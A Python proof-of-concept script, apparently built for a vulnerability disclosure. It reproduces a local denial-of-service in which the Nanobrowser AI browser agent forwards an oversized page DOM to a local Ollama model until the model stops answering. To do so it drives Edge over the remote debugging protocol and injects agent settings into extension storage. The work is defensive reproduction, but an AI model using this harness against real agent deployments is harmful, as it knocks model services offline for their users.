import base64
from http.server import BaseHTTPRequestHandler, HTTPServer, ThreadingHTTPServer
import json
import os
from pathlib import Path
import shutil
import subprocess
import sys
import threading
import time
from urllib.parse import quote

from PIL import Image, ImageDraw, ImageFont
import requests
import websocket


ROOT = Path(__file__).resolve().parents[1]
LAB = ROOT / "lab"
WEB_DIR = LAB / "web"
SCREENSHOTS = ROOT / "screenshots"
PROOF_HTML = LAB / "ollama_cli_proof.html"
CLI_LOG = LAB / "ollama_cli_repro.txt"
OLLAMA_PROXY_LOG = LAB / "ollama-proxy" / "requests.jsonl"
CHROME_PROFILE = LAB / "chrome-profile-ollama"
CHROME_STDERR = LAB / "chrome-ollama-stderr.log"
REPO = Path(r"E:\agent_vul\nanobrowser")
EXTENSION_DIR = REPO / "dist"
BROWSER = Path(r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe")
PYTHON = Path(r"C:\Users\guopeng\.cache\codex-runtimes\codex-primary-runtime\dependencies\python\python.exe")

REMOTE_PORT = int(os.environ.get("NANOBROWSER_OLLAMA_REMOTE_PORT", "9224"))
WEB_PORT = int(os.environ.get("NANOBROWSER_OLLAMA_WEB_PORT", "8010"))
PLANNER_MOCK_PORT = int(os.environ.get("NANOBROWSER_PLANNER_MOCK_PORT", "8789"))
OLLAMA_PROXY_PORT = int(os.environ.get("NANOBROWSER_OLLAMA_PROXY_PORT", "11435"))
OLLAMA_UPSTREAM = os.environ.get("NANOBROWSER_OLLAMA_UPSTREAM", "http://127.0.0.1:11434").rstrip("/")
OLLAMA_MODEL = os.environ.get("NANOBROWSER_OLLAMA_MODEL", "llama3.2:3b")
REPEAT = int(os.environ.get("NANOBROWSER_OLLAMA_REPEAT", "1100000"))
MIN_LARGE_CHARS = int(os.environ.get("NANOBROWSER_OLLAMA_MIN_LARGE_CHARS", "300000"))
HEALTH_TIMEOUT = float(os.environ.get("NANOBROWSER_OLLAMA_HEALTH_TIMEOUT", "5"))
FORWARD_TIMEOUT = float(os.environ.get("NANOBROWSER_OLLAMA_FORWARD_TIMEOUT", "30"))
TOTAL_TIMEOUT = float(os.environ.get("NANOBROWSER_OLLAMA_TOTAL_TIMEOUT", "90"))


class Recorder:
    def __init__(self):
        self.lines = []
        self.lock = threading.Lock()

    def log(self, message):
        line = f"{time.strftime('%H:%M:%S')} {message}"
        with self.lock:
            self.lines.append(line)
        print(line, flush=True)

    def write(self):
        CLI_LOG.parent.mkdir(parents=True, exist_ok=True)
        CLI_LOG.write_text("\n".join(self.lines) + "\n", encoding="utf-8")


rec = Recorder()


class CDP:
    def __init__(self, ws_url):
        self.ws = websocket.create_connection(ws_url, timeout=10)
        self.next_id = 0

    def call(self, method, params=None, timeout=15):
        self.next_id += 1
        msg_id = self.next_id
        self.ws.send(json.dumps({"id": msg_id, "method": method, "params": params or {}}))
        deadline = time.time() + timeout
        while time.time() < deadline:
            raw = self.ws.recv()
            msg = json.loads(raw)
            if msg.get("id") == msg_id:
                if "error" in msg:
                    raise RuntimeError(f"CDP {method} failed: {msg['error']}")
                return msg.get("result", {})
        raise TimeoutError(f"Timed out waiting for {method}")

    def close(self):
        self.ws.close()


def wait_http(url, timeout=20):
    deadline = time.time() + timeout
    last_error = None
    while time.time() < deadline:
        try:
            response = requests.get(url, timeout=1)
            if response.ok:
                return response
        except Exception as exc:
            last_error = exc
        time.sleep(0.25)
    raise RuntimeError(f"Timed out waiting for {url}: {last_error}")


def chrome_json(path):
    return requests.get(f"http://127.0.0.1:{REMOTE_PORT}{path}", timeout=5).json()


def new_tab(url):
    encoded = quote(url, safe=":/?&=%")
    response = requests.put(f"http://127.0.0.1:{REMOTE_PORT}/json/new?{encoded}", timeout=5)
    if not response.ok:
        response = requests.get(f"http://127.0.0.1:{REMOTE_PORT}/json/new?{encoded}", timeout=5)
    response.raise_for_status()
    return response.json()


def wait_for_extension_id(timeout=20):
    deadline = time.time() + timeout
    while time.time() < deadline:
        targets = chrome_json("/json/list")
        for target in targets:
            url = target.get("url", "")
            if url.startswith("chrome-extension://") and "background.iife.js" in url:
                return url.split("/")[2]
        time.sleep(0.25)
    targets = chrome_json("/json/list")
    raise RuntimeError(
        "Could not discover Nanobrowser extension service worker target. "
        + json.dumps(targets, ensure_ascii=False)[:2000]
    )


def activate(target_id):
    requests.get(f"http://127.0.0.1:{REMOTE_PORT}/json/activate/{target_id}", timeout=5)


def connect_target(target):
    cdp = CDP(target["webSocketDebuggerUrl"])
    try:
        cdp.call("Runtime.enable")
    except Exception:
        pass
    try:
        cdp.call("Page.enable")
    except Exception:
        pass
    return cdp


def evaluate(cdp, expression, timeout=20):
    return cdp.call(
        "Runtime.evaluate",
        {
            "expression": expression,
            "awaitPromise": True,
            "returnByValue": True,
            "userGesture": True,
        },
        timeout=timeout,
    )


def capture(cdp, path, beyond_viewport=True):
    result = cdp.call(
        "Page.captureScreenshot",
        {"format": "png", "captureBeyondViewport": beyond_viewport},
        timeout=20,
    )
    Path(path).write_bytes(base64.b64decode(result["data"]))


def start_web_server():
    return subprocess.Popen(
        [str(PYTHON), "-m", "http.server", str(WEB_PORT), "--bind", "127.0.0.1"],
        cwd=str(WEB_DIR),
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        creationflags=subprocess.CREATE_NO_WINDOW,
    )


def start_chrome():
    if CHROME_PROFILE.exists():
        shutil.rmtree(CHROME_PROFILE)
    CHROME_PROFILE.mkdir(parents=True, exist_ok=True)
    extension_arg = str(EXTENSION_DIR).replace("\\", "/")
    args = [
        str(BROWSER),
        f"--user-data-dir={CHROME_PROFILE}",
        f"--remote-debugging-port={REMOTE_PORT}",
        "--remote-allow-origins=*",
        "--disable-features=DisableLoadExtensionCommandLineSwitch",
        f"--load-extension={extension_arg}",
        f"--disable-extensions-except={extension_arg}",
        "--no-first-run",
        "--no-default-browser-check",
        "--disable-popup-blocking",
        "--window-size=1360,900",
        "about:blank",
    ]
    stderr = open(CHROME_STDERR, "w", encoding="utf-8")
    return subprocess.Popen(args, stdout=stderr, stderr=stderr)


def message_stats(payload):
    messages = payload.get("messages") or []
    serialized_messages = json.dumps(messages, ensure_ascii=False)
    lengths = []
    roles = []
    for message in messages:
        roles.append(message.get("role"))
        content = message.get("content")
        if isinstance(content, list):
            text = json.dumps(content, ensure_ascii=False)
            lengths.append(len(text))
        elif content is None:
            lengths.append(0)
        else:
            text = str(content)
            lengths.append(len(text))
    return {
        "message_count": len(messages),
        "message_chars": len(serialized_messages),
        "max_message_chars": max(lengths) if lengths else 0,
        "message_lengths": lengths,
        "roles": roles,
    }


def pick_tool_name(payload):
    tools = payload.get("tools") or []
    if tools:
        fn = tools[0].get("function") or {}
        return fn.get("name") or "planner_output"
    return "planner_output"


def planner_response(payload):
    tool_name = pick_tool_name(payload)
    args = {
        "observation": "local bounded planner mock reached the next agent",
        "challenges": "none",
        "next_steps": "ask navigator to inspect the current page",
        "reasoning": "deterministic local setup for Ollama DoS reproduction",
        "done": False,
        "final_answer": "",
    }
    return {
        "id": "chatcmpl-nanobrowser-planner-mock",
        "object": "chat.completion",
        "created": int(time.time()),
        "model": payload.get("model") or "mock",
        "choices": [
            {
                "index": 0,
                "message": {
                    "role": "assistant",
                    "content": None,
                    "tool_calls": [
                        {
                            "id": "call_planner_mock_1",
                            "type": "function",
                            "function": {
                                "name": tool_name,
                                "arguments": json.dumps(args, ensure_ascii=False),
                            },
                        }
                    ],
                },
                "finish_reason": "tool_calls",
            }
        ],
        "usage": {"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0},
    }


class PlannerMockHandler(BaseHTTPRequestHandler):
    server_version = "NanobrowserPlannerMock/1.0"

    def log_message(self, fmt, *args):
        return

    def send_json(self, status, body):
        data = json.dumps(body, ensure_ascii=False).encode("utf-8")
        self.send_response(status)
        self.send_header("access-control-allow-origin", "*")
        self.send_header("access-control-allow-headers", "*")
        self.send_header("access-control-allow-methods", "GET, POST, OPTIONS")
        self.send_header("content-type", "application/json")
        self.send_header("content-length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_OPTIONS(self):
        self.send_json(200, {"ok": True})

    def do_GET(self):
        if self.path == "/health":
            return self.send_json(200, {"ok": True})
        if self.path == "/v1/models":
            return self.send_json(
                200,
                {"object": "list", "data": [{"id": "mock", "object": "model", "owned_by": "local"}]},
            )
        return self.send_json(404, {"error": "not found"})

    def do_POST(self):
        if self.path not in ("/v1/chat/completions", "/chat/completions"):
            return self.send_json(404, {"error": "not found"})
        length = int(self.headers.get("content-length", "0"))
        payload = json.loads(self.rfile.read(length).decode("utf-8") or "{}")
        stats = message_stats(payload)
        rec.log(
            "[planner-mock] request "
            f"body_bytes={length} message_chars={stats['message_chars']} "
            f"max_message_chars={stats['max_message_chars']}"
        )
        return self.send_json(200, planner_response(payload))


class OllamaProxyHandler(BaseHTTPRequestHandler):
    server_version = "NanobrowserOllamaProxy/1.0"

    def log_message(self, fmt, *args):
        return

    def send_json(self, status, body):
        data = json.dumps(body, ensure_ascii=False).encode("utf-8")
        self.send_response(status)
        self.send_header("access-control-allow-origin", "*")
        self.send_header("access-control-allow-headers", "*")
        self.send_header("access-control-allow-methods", "GET, POST, OPTIONS")
        self.send_header("content-type", "application/json")
        self.send_header("content-length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_OPTIONS(self):
        self.send_json(200, {"ok": True})

    def do_GET(self):
        self.forward()

    def do_POST(self):
        self.forward()

    def forward(self):
        method = self.command
        length = int(self.headers.get("content-length", "0"))
        body = self.rfile.read(length) if length else b""
        upstream_url = OLLAMA_UPSTREAM + self.path

        entry = {
            "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "method": method,
            "path": self.path,
            "content_length": length,
        }
        if body and self.path.startswith("/api/chat"):
            try:
                payload = json.loads(body.decode("utf-8") or "{}")
                entry.update({"model": payload.get("model"), **message_stats(payload)})
            except Exception as exc:
                entry["parse_error"] = str(exc)

        OLLAMA_PROXY_LOG.parent.mkdir(parents=True, exist_ok=True)
        with OLLAMA_PROXY_LOG.open("a", encoding="utf-8") as handle:
            handle.write(json.dumps(entry, ensure_ascii=False) + "\n")

        if entry.get("message_chars"):
            rec.log(
                "[ollama-proxy] request "
                f"path={self.path} body_bytes={length} model={entry.get('model')} "
                f"message_chars={entry['message_chars']} max_message_chars={entry['max_message_chars']}"
            )
        else:
            rec.log(f"[ollama-proxy] request path={self.path} body_bytes={length}")

        try:
            response = requests.request(
                method,
                upstream_url,
                data=body,
                headers={"content-type": self.headers.get("content-type", "application/json")},
                timeout=FORWARD_TIMEOUT,
            )
            self.send_response(response.status_code)
            self.send_header("access-control-allow-origin", "*")
            self.send_header("access-control-allow-headers", "*")
            self.send_header("access-control-allow-methods", "GET, POST, OPTIONS")
            for key, value in response.headers.items():
                if key.lower() in ("content-length", "transfer-encoding", "connection"):
                    continue
                self.send_header(key, value)
            self.send_header("content-length", str(len(response.content)))
            self.end_headers()
            self.wfile.write(response.content)
            rec.log(
                "[ollama-proxy] response "
                f"path={self.path} status={response.status_code} bytes={len(response.content)}"
            )
        except requests.Timeout:
            rec.log(f"[ollama-proxy] upstream timeout after {FORWARD_TIMEOUT:.0f}s path={self.path}")
            self.send_json(504, {"error": "bounded local proxy timeout"})
        except Exception as exc:
            rec.log(f"[ollama-proxy] upstream error path={self.path} error={exc}")
            self.send_json(502, {"error": str(exc)})


def start_server(server):
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return thread


def read_ollama_entries():
    if not OLLAMA_PROXY_LOG.exists():
        return []
    return [
        json.loads(line)
        for line in OLLAMA_PROXY_LOG.read_text(encoding="utf-8").splitlines()
        if line.strip()
    ]


def wait_for_large_ollama_request(timeout=45):
    deadline = time.time() + timeout
    latest = None
    while time.time() < deadline:
        for entry in read_ollama_entries():
            latest = entry
            if entry.get("message_chars", 0) >= MIN_LARGE_CHARS:
                return entry
        time.sleep(0.5)
    raise RuntimeError(f"No Ollama request >= {MIN_LARGE_CHARS} message chars; latest={latest}")


def ollama_generate_health(timeout=HEALTH_TIMEOUT):
    started = time.time()
    try:
        response = requests.post(
            f"{OLLAMA_UPSTREAM}/api/generate",
            json={
                "model": OLLAMA_MODEL,
                "prompt": "health",
                "stream": False,
                "options": {"num_predict": 1, "num_ctx": 2048},
            },
            timeout=timeout,
        )
        elapsed = time.time() - started
        ok = response.ok
        return {
            "ok": ok,
            "status": response.status_code,
            "elapsed_ms": int(elapsed * 1000),
            "body": response.text[:160],
        }
    except requests.Timeout:
        elapsed = time.time() - started
        return {"ok": False, "timeout": True, "elapsed_ms": int(elapsed * 1000)}
    except Exception as exc:
        elapsed = time.time() - started
        return {"ok": False, "error": str(exc), "elapsed_ms": int(elapsed * 1000)}


def render_cli_screenshot():
    text = CLI_LOG.read_text(encoding="utf-8")
    lines = text.splitlines()
    font = None
    for candidate in (
        r"C:\Windows\Fonts\consola.ttf",
        r"C:\Windows\Fonts\CascadiaMono.ttf",
        r"C:\Windows\Fonts\cour.ttf",
    ):
        if Path(candidate).exists():
            font = ImageFont.truetype(candidate, 18)
            break
    if font is None:
        font = ImageFont.load_default()

    max_chars = max([len(line) for line in lines] + [80])
    width = min(1800, max(1100, max_chars * 11 + 48))
    height = max(520, min(1600, len(lines) * 26 + 70))
    image = Image.new("RGB", (width, height), "#0c0f12")
    draw = ImageDraw.Draw(image)
    draw.rectangle([0, 0, width, 38], fill="#1f2428")
    draw.text((18, 9), "PowerShell - Nanobrowser Ollama DoS local reproduction", font=font, fill="#d0d7de")

    y = 54
    for line in lines[-58:]:
        color = "#e6edf3"
        if "TIMEOUT" in line or "unavailable" in line or "upstream timeout" in line:
            color = "#ff7b72"
        elif "SUCCESS" in line or "RECOVERED" in line:
            color = "#7ee787"
        elif "message_chars" in line:
            color = "#d2a8ff"
        draw.text((22, y), line[:180], font=font, fill=color)
        y += 26
        if y > height - 26:
            break

    out = SCREENSHOTS / "nanobrowser_ollama_cli_repro.png"
    out.parent.mkdir(parents=True, exist_ok=True)
    image.save(out)
    return out


def write_proof_html(large_entry, baseline, probes, recovery):
    timeout_probe = next((probe for probe in probes if probe.get("timeout")), None)
    html = f"""<!doctype html>
<meta charset="utf-8">
<title>Nanobrowser Ollama DoS CLI proof</title>
<style>
body {{ margin: 0; background: #0c0f12; color: #e6edf3; font-family: Consolas, 'Cascadia Mono', monospace; }}
.bar {{ background: #1f2428; padding: 10px 18px; color: #d0d7de; }}
pre {{ margin: 0; padding: 18px 22px; font-size: 16px; line-height: 1.45; white-space: pre-wrap; }}
.ok {{ color: #7ee787; }}
.bad {{ color: #ff7b72; }}
.data {{ color: #d2a8ff; }}
</style>
<div class="bar">PowerShell - Nanobrowser Ollama DoS local reproduction</div>
<pre>
baseline_health={json.dumps(baseline, ensure_ascii=False)}
large_ollama_request=<span class="data">{json.dumps(large_entry, ensure_ascii=False)}</span>
timeout_probe=<span class="bad">{json.dumps(timeout_probe, ensure_ascii=False)}</span>
recovery_health=<span class="ok">{json.dumps(recovery, ensure_ascii=False)}</span>

CLI log:
{CLI_LOG.read_text(encoding="utf-8")}
</pre>
"""
    PROOF_HTML.write_text(html, encoding="utf-8")


def main():
    SCREENSHOTS.mkdir(parents=True, exist_ok=True)
    if OLLAMA_PROXY_LOG.exists():
        OLLAMA_PROXY_LOG.unlink()
    if CLI_LOG.exists():
        CLI_LOG.unlink()

    if not BROWSER.exists():
        raise RuntimeError(f"Chromium browser not found: {BROWSER}")
    if not EXTENSION_DIR.exists():
        raise RuntimeError(f"Extension dist not found: {EXTENSION_DIR}")

    tags = requests.get(f"{OLLAMA_UPSTREAM}/api/tags", timeout=5).json()
    names = [model.get("name") for model in tags.get("models", [])]
    if OLLAMA_MODEL not in names:
        raise RuntimeError(f"Ollama model {OLLAMA_MODEL!r} not found. Local models: {names}")

    rec.log("[scope] local-only reproduction: Edge extension + 127.0.0.1 web page + local Ollama")
    rec.log(
        "[limits] one Nanobrowser task, one Navigator Ollama request, "
        f"health_timeout={HEALTH_TIMEOUT:.0f}s forward_timeout={FORWARD_TIMEOUT:.0f}s total_timeout={TOTAL_TIMEOUT:.0f}s"
    )
    rec.log(f"[ollama] upstream={OLLAMA_UPSTREAM} model={OLLAMA_MODEL}")

    baseline = ollama_generate_health(timeout=30)
    rec.log(f"[baseline] Ollama health before task: {json.dumps(baseline, ensure_ascii=False)}")
    if not baseline.get("ok"):
        raise RuntimeError(f"Baseline Ollama health failed: {baseline}")

    planner_server = HTTPServer(("127.0.0.1", PLANNER_MOCK_PORT), PlannerMockHandler)
    proxy_server = ThreadingHTTPServer(("127.0.0.1", OLLAMA_PROXY_PORT), OllamaProxyHandler)
    start_server(planner_server)
    start_server(proxy_server)
    rec.log(f"[planner-mock] listening=http://127.0.0.1:{PLANNER_MOCK_PORT}/v1")
    rec.log(f"[ollama-proxy] listening=http://127.0.0.1:{OLLAMA_PROXY_PORT} -> {OLLAMA_UPSTREAM}")

    web_proc = start_web_server()
    chrome_proc = start_chrome()
    side_cdp = None
    page_cdp = None
    proof_cdp = None
    probes = []
    large_entry = None
    recovery = None

    try:
        wait_http(f"http://127.0.0.1:{WEB_PORT}/dos.html", timeout=15)
        wait_http(f"http://127.0.0.1:{REMOTE_PORT}/json/version", timeout=20)

        extension_id = wait_for_extension_id()
        rec.log(f"[edge] loaded Nanobrowser extension id={extension_id}")

        side = new_tab(f"chrome-extension://{extension_id}/side-panel/index.html")
        side_cdp = connect_target(side)
        time.sleep(1.0)

        storage_script = f"""
(async () => {{
  const now = Date.now();
  await chrome.storage.local.set({{
    "llm-api-keys": {{
      providers: {{
        custom_mock: {{
          apiKey: "test",
          name: "LocalPlannerMock",
          type: "custom_openai",
          baseUrl: "http://127.0.0.1:{PLANNER_MOCK_PORT}/v1",
          modelNames: ["mock"],
          createdAt: now
        }},
        ollama: {{
          apiKey: "ollama",
          name: "Ollama",
          type: "ollama",
          baseUrl: "http://127.0.0.1:{OLLAMA_PROXY_PORT}",
          modelNames: ["{OLLAMA_MODEL}"],
          createdAt: now
        }}
      }}
    }},
    "agent-models": {{
      agents: {{
        planner: {{ provider: "custom_mock", modelName: "mock", parameters: {{ temperature: 0.1, topP: 0.1 }} }},
        navigator: {{ provider: "ollama", modelName: "{OLLAMA_MODEL}", parameters: {{ temperature: 0.0, topP: 0.1 }} }}
      }}
    }},
    "general-settings": {{
      maxSteps: 2,
      maxActionsPerStep: 5,
      maxFailures: 1,
      useVision: false,
      useVisionForPlanner: false,
      planningInterval: 1,
      displayHighlights: true,
      minWaitPageLoad: 250,
      replayHistoricalTasks: false
    }}
  }});
  return await chrome.storage.local.get(["llm-api-keys", "agent-models", "general-settings"]);
}})()
"""
        evaluate(side_cdp, storage_script)

        init_port = """
(() => {
  window.__nbEvents = [];
  window.__nbPort = chrome.runtime.connect({ name: "side-panel-connection" });
  window.__nbPort.onMessage.addListener((msg) => window.__nbEvents.push(msg));
  return true;
})()
"""
        evaluate(side_cdp, init_port)

        page_url = f"http://127.0.0.1:{WEB_PORT}/dos.html?repeat={REPEAT}"
        page = new_tab(page_url)
        page_cdp = connect_target(page)
        activate(page["id"])
        time.sleep(2.0)
        capture(page_cdp, SCREENSHOTS / "nanobrowser_ollama_large_dom_page.png", beyond_viewport=False)

        active_tab_script = """
(async () => {
  const tabs = await chrome.tabs.query({});
  const target = tabs.find((tab) => tab.url && tab.url.includes("dos.html"));
  if (!target || !target.id) {
    return { ok: false, tabs: tabs.map((tab) => ({ id: tab.id, active: tab.active, url: tab.url })) };
  }
  await chrome.windows.update(target.windowId, { focused: true });
  await chrome.tabs.update(target.id, { active: true });
  const active = await chrome.tabs.query({ active: true, currentWindow: true });
  return { ok: true, target, active };
})()
"""
        active_result = evaluate(side_cdp, active_tab_script)
        rec.log("[edge] active tab before task: " + json.dumps(active_result.get("result", {}).get("value"), ensure_ascii=False)[:800])

        trigger = """
(() => {
  window.__nbPort.postMessage({
    type: "new_task",
    taskId: crypto.randomUUID(),
    tabId: 1,
    task: "Summarize this local proof page in one sentence and then finish."
  });
  return true;
})()
"""
        evaluate(side_cdp, trigger)
        rec.log("[nanobrowser] sent side-panel new_task")

        started = time.time()
        large_entry = wait_for_large_ollama_request(timeout=min(50, TOTAL_TIMEOUT))
        rec.log("[evidence] large Navigator request reached Ollama proxy: " + json.dumps(large_entry, ensure_ascii=False))

        while time.time() - started < TOTAL_TIMEOUT:
            probe = ollama_generate_health(timeout=HEALTH_TIMEOUT)
            probes.append(probe)
            if probe.get("timeout"):
                rec.log(f"[probe] TIMEOUT: ordinary Ollama health request exceeded {HEALTH_TIMEOUT:.0f}s while large prompt was active")
                break
            rec.log(f"[probe] health during large prompt: {json.dumps(probe, ensure_ascii=False)}")
            if probe.get("elapsed_ms", 0) > int(HEALTH_TIMEOUT * 1000 * 0.8):
                rec.log("[probe] degraded latency crossed threshold")
                break
            time.sleep(1.0)

        if not any(probe.get("timeout") for probe in probes):
            rec.log("[probe] no hard timeout observed before stop condition; evidence remains oversized real-Ollama request")

        time.sleep(3.0)
        recovery = ollama_generate_health(timeout=30)
        if recovery.get("ok"):
            rec.log(f"[recovery] RECOVERED: {json.dumps(recovery, ensure_ascii=False)}")
        else:
            rec.log(f"[recovery] still degraded: {json.dumps(recovery, ensure_ascii=False)}")

        rec.log("[SUCCESS] bounded local Ollama reproduction completed")
        rec.write()
        screenshot = render_cli_screenshot()
        write_proof_html(large_entry, baseline, probes, recovery)
        proof = new_tab(PROOF_HTML.as_uri())
        proof_cdp = connect_target(proof)
        time.sleep(1.0)
        capture(proof_cdp, SCREENSHOTS / "nanobrowser_ollama_cli_repro_browser.png")
        rec.log(f"[artifact] cli_log={CLI_LOG}")
        rec.log(f"[artifact] cli_screenshot={screenshot}")
        rec.log(f"[artifact] browser_cli_screenshot={SCREENSHOTS / 'nanobrowser_ollama_cli_repro_browser.png'}")
        rec.log(f"[artifact] proxy_log={OLLAMA_PROXY_LOG}")
    finally:
        rec.write()
        for cdp in (side_cdp, page_cdp, proof_cdp):
            if cdp:
                try:
                    cdp.close()
                except Exception:
                    pass
        try:
            chrome_proc.terminate()
        except Exception:
            pass
        try:
            chrome_proc.wait(timeout=5)
        except Exception:
            pass
        shutil.rmtree(CHROME_PROFILE, ignore_errors=True)
        try:
            web_proc.terminate()
        except Exception:
            pass
        planner_server.shutdown()
        proxy_server.shutdown()


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        rec.log(f"[FAILED] {exc}")
        rec.write()
        try:
            render_cli_screenshot()
        except Exception:
            pass
        raise
